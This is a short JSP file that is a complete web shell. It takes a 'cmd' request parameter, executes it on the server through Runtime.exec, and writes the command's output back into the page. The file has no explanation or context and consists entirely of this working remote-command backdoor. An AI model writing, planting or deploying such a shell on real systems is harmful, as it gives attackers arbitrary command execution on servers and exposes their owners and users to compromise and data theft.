<%@ page import="java.io.*" %>
    <% if(request.getParameter("cmd")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
        BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String line;
        while((line=br.readLine())!=null){ out.println(line); } } %>